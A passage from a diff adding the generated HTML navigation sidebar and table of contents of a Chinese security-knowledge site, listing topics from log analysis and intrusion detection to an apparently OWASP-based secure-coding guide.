+  <li class="md-nav__item">
+    <a href="../../vulnerability-management/vm-tools-defectdojo/" title="defectdojo" class="md-nav__link">
+      defectdojo
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-8" type="checkbox" id="nav-2-8">
+    
+    <label class="md-nav__link" for="nav-2-8">
+      Web security scan
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-8">
+        Web security scan
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web-security-scan/" title="Web安全扫描" class="md-nav__link">
+      Web安全扫描
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Business
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Business
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../business/captcha/" title="验证码安全" class="md-nav__link">
+      验证码安全
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Infrastructure security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Infrastructure security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/" title="基础设施安全" class="md-nav__link">
+      基础设施安全
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2" type="checkbox" id="nav-4-2">
+    
+    <label class="md-nav__link" for="nav-4-2">
+      Host security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-2">
+        Host security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/" title="主机安全" class="md-nav__link">
+      主机安全
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2-2" type="checkbox" id="nav-4-2-2">
+    
+    <label class="md-nav__link" for="nav-4-2-2">
+      Fortress machine
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-2-2">
+        Fortress machine
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/fortress-machine/jumpserver/" title="jumpserver 开源堡垒机" class="md-nav__link">
+      jumpserver 开源堡垒机
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2-3" type="checkbox" id="nav-4-2-3">
+    
+    <label class="md-nav__link" for="nav-4-2-3">
+      Honeypot
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-2-3">
+        Honeypot
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/honeypot/" title="蜜罐技术" class="md-nav__link">
+      蜜罐技术
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/honeypot/mhn-honeypot/" title="MHN蜜罐" class="md-nav__link">
+      MHN蜜罐
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2-4" type="checkbox" id="nav-4-2-4">
+    
+    <label class="md-nav__link" for="nav-4-2-4">
+      Host security scan
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-2-4">
+        Host security scan
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/host-security-scan/" title="主机安全扫描" class="md-nav__link">
+      主机安全扫描
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/host-security-scan/open-source-scanner/" title="开源扫描器" class="md-nav__link">
+      开源扫描器
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/host-security-scan/port/" title="端口安全" class="md-nav__link">
+      端口安全
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2-5" type="checkbox" id="nav-4-2-5">
+    
+    <label class="md-nav__link" for="nav-4-2-5">
+      Ids ips
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-2-5">
+        Ids ips
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/ids-ips/" title="主机入侵检测&防御系统" class="md-nav__link">
+      主机入侵检测&防御系统
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/ids-ips/aide/" title="aide 文件和目录完整性入群检测" class="md-nav__link">
+      aide 文件和目录完整性入群检测
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/ids-ips/osquery/" title="osquery 操作系统检测与分析" class="md-nav__link">
+      osquery 操作系统检测与分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/ids-ips/wazuh/" title="wazuh 主机入侵检测系统" class="md-nav__link">
+      wazuh 主机入侵检测系统
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-2-6" type="checkbox" id="nav-4-2-6">
+    
+    <label class="md-nav__link" for="nav-4-2-6">
+      Log analysis
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-2-6">
+        Log analysis
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/log-analysis/" title="日志分析" class="md-nav__link">
+      日志分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/log-analysis/elk1/" title="ELK日志分析系统" class="md-nav__link">
+      ELK日志分析系统
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/log-analysis/elk2-advanced/" title="ELK高级使用" class="md-nav__link">
+      ELK高级使用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/log-analysis/elk3-problem/" title="ELK问题踩坑" class="md-nav__link">
+      ELK问题踩坑
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/log-analysis/elk4-grokdebug/" title="Logstash Patterns" class="md-nav__link">
+      Logstash Patterns
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/log-analysis/elk5-elastalert/" title="ELK监控报警系统-elastalert" class="md-nav__link">
+      ELK监控报警系统-elastalert
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/log-analysis/graylog1/" title="Graylog日志管理系统" class="md-nav__link">
+      Graylog日志管理系统
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/host-security/log-analysis/graylog2-advanced/" title="Graylog高级使用" class="md-nav__link">
+      Graylog高级使用
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-3" type="checkbox" id="nav-4-3">
+    
+    <label class="md-nav__link" for="nav-4-3">
+      Network security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-4-3">
+        Network security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/network-security/" title="网络安全" class="md-nav__link">
+      网络安全
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-3-2" type="checkbox" id="nav-4-3-2">
+    
+    <label class="md-nav__link" for="nav-4-3-2">
+      Cc dos ddos
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-3-2">
+        Cc dos ddos
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/network-security/cc-dos-ddos/cc/" title="应用层拒绝服务攻击" class="md-nav__link">
+      应用层拒绝服务攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/network-security/cc-dos-ddos/dos-ddos/" title="拒绝服务攻击" class="md-nav__link">
+      拒绝服务攻击
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-3-3" type="checkbox" id="nav-4-3-3">
+    
+    <label class="md-nav__link" for="nav-4-3-3">
+      Ids ips
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-3-3">
+        Ids ips
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/network-security/ids-ips/bro/" title="bro 网络安全监控" class="md-nav__link">
+      bro 网络安全监控
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-3-4" type="checkbox" id="nav-4-3-4">
+    
+    <label class="md-nav__link" for="nav-4-3-4">
+      Network security monitor
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-3-4">
+        Network security monitor
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/network-security/network-security-monitor/github-monitor/" title="GitHub信息泄漏监控" class="md-nav__link">
+      GitHub信息泄漏监控
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-3-5" type="checkbox" id="nav-4-3-5">
+    
+    <label class="md-nav__link" for="nav-4-3-5">
+      Office network security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-4-3-5">
+        Office network security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/network-security/office-network-security/" title="办公网网络安全" class="md-nav__link">
+      办公网网络安全
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/network-security/office-network-security/email-security/" title="邮件安全" class="md-nav__link">
+      邮件安全
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../infrastructure-security/network-security/office-network-security/gophish/" title="gophish 开源钓鱼工具" class="md-nav__link">
+      gophish 开源钓鱼工具
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Miscellaneous
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Miscellaneous
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../miscellaneous/jsrc-1/" title="白帽子转型甲方杂绪" class="md-nav__link">
+      白帽子转型甲方杂绪
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      Other security branch
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        Other security branch
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
+    
+    <label class="md-nav__link" for="nav-6-1">
+      Asset management
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-1">
+        Asset management
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/asset-management/" title="资产管理" class="md-nav__link">
+      资产管理
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/asset-management/asset-acquisition/" title="资产管理平台" class="md-nav__link">
+      资产管理平台
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">
+    
+    <label class="md-nav__link" for="nav-6-2">
+      Data security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-2">
+        Data security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/data-security/" title="数据安全" class="md-nav__link">
+      数据安全
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-2-2" type="checkbox" id="nav-6-2-2">
+    
+    <label class="md-nav__link" for="nav-6-2-2">
+      Big data security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-6-2-2">
+        Big data security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/data-security/big-data-security/" title="大数据安全" class="md-nav__link">
+      大数据安全
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-3" type="checkbox" id="nav-6-3">
+    
+    <label class="md-nav__link" for="nav-6-3">
+      Emergency response
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-3">
+        Emergency response
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/emergency-response/chkrootkit/" title="chkrootkit Linux入侵检测" class="md-nav__link">
+      chkrootkit Linux入侵检测
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/emergency-response/lynis/" title="lynis Linux安全审计工具" class="md-nav__link">
+      lynis Linux安全审计工具
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/emergency-response/rkhunter/" title="rkhunter Linux入侵检测" class="md-nav__link">
+      rkhunter Linux入侵检测
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-4" type="checkbox" id="nav-6-4">
+    
+    <label class="md-nav__link" for="nav-6-4">
+      Identity and access security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-4">
+        Identity and access security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/identity-and-access-security/freeipa/" title="基于Linux开源身份认证体系FreeIPA" class="md-nav__link">
+      基于Linux开源身份认证体系FreeIPA
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-5" type="checkbox" id="nav-6-5">
+    
+    <label class="md-nav__link" for="nav-6-5">
+      Security operation
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-5">
+        Security operation
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/security-operation/security-platform/" title="中小型企业自建安全平台" class="md-nav__link">
+      中小型企业自建安全平台
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-6" type="checkbox" id="nav-6-6">
+    
+    <label class="md-nav__link" for="nav-6-6">
+      Virtualization security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-6-6">
+        Virtualization security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../other-security-branch/virtualization-security/docker-security/" title="Docker安全总结" class="md-nav__link">
+      Docker安全总结
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="介绍" class="md-nav__link">
+    介绍
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checkmarx" title="关于Checkmarx" class="md-nav__link">
+    关于Checkmarx
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#owasp" title="关于OWASP安全编程实践" class="md-nav__link">
+    关于OWASP安全编程实践
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="输入验证" class="md-nav__link">
+    输入验证
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="验证" class="md-nav__link">
+    验证
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="用户交互" class="md-nav__link">
+    用户交互
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="文件操作" class="md-nav__link">
+    文件操作
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" title="数据源" class="md-nav__link">
+    数据源
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post" title="POST验证操作" class="md-nav__link">
+    POST验证操作
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" title="处理" class="md-nav__link">
+    处理
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" title="将小于字符的单个字符转化为实体" class="md-nav__link">
+    将小于字符的单个字符转化为实体
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" title="删除所有标签" class="md-nav__link">
+    删除所有标签
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" title="删除换行符、制表符和多余的空格" class="md-nav__link">
+    删除换行符、制表符和多余的空格
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url" title="URL请求路径" class="md-nav__link">
+    URL请求路径
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" title="输出编码" class="md-nav__link">
+    输出编码
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" title="XSS跨站脚本" class="md-nav__link">
+    XSS跨站脚本
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql" title="SQL注入" class="md-nav__link">
+    SQL注入
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_12" title="认证与密码管理" class="md-nav__link">
+    认证与密码管理
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" title="认证与密码管理" class="md-nav__link">
+    认证与密码管理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" title="经验规则" class="md-nav__link">
+    经验规则
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" title="身份验证数据通信" class="md-nav__link">
+    身份验证数据通信
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" title="验证与存储" class="md-nav__link">
+    验证与存储
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" title="验证" class="md-nav__link">
+    验证
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" title="安全存储密码理论" class="md-nav__link">
+    安全存储密码理论
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" title="安全存储密码实践" class="md-nav__link">
+    安全存储密码实践
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" title="密码策略" class="md-nav__link">
+    密码策略
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_21" title="重置" class="md-nav__link">
+    重置
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" title="其它指南" class="md-nav__link">
+    其它指南
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session" title="Session管理" class="md-nav__link">
+    Session管理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_23" title="访问控制" class="md-nav__link">
+    访问控制
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_24" title="密码学实践" class="md-nav__link">
+    密码学实践
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_25" title="伪随机生成器" class="md-nav__link">
+    伪随机生成器
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_26" title="错误处理和记录" class="md-nav__link">
+    错误处理和记录
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_27" title="错误处理" class="md-nav__link">
+    错误处理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_28" title="日志" class="md-nav__link">
+    日志
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_29" title="数据保护" class="md-nav__link">
+    数据保护
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_30" title="删除敏感信息" class="md-nav__link">
+    删除敏感信息
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_31" title="注释" class="md-nav__link">
+    注释
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url_1" title="URL" class="md-nav__link">
+    URL
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_32" title="信息就是力量" class="md-nav__link">
+    信息就是力量
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_33" title="加密是关键" class="md-nav__link">
+    加密是关键
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_34" title="禁用不需要的内容" class="md-nav__link">
+    禁用不需要的内容
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_35" title="自动完成" class="md-nav__link">
+    自动完成
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_36" title="缓存" class="md-nav__link">
+    缓存
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_37" title="通信安全" class="md-nav__link">
+    通信安全
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#httptls" title="HTTP/TLS" class="md-nav__link">
+    HTTP/TLS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#websockets" title="Websockets" class="md-nav__link">
+    Websockets
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#origin-header" title="Origin header" class="md-nav__link">
+    Origin header
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_38" title="机密性和完整性" class="md-nav__link">
+    机密性和完整性
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_39" title="认证和授权" class="md-nav__link">
+    认证和授权
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_40" title="输入数据清理" class="md-nav__link">
+    输入数据清理
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_41" title="系统配置" class="md-nav__link">
+    系统配置
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
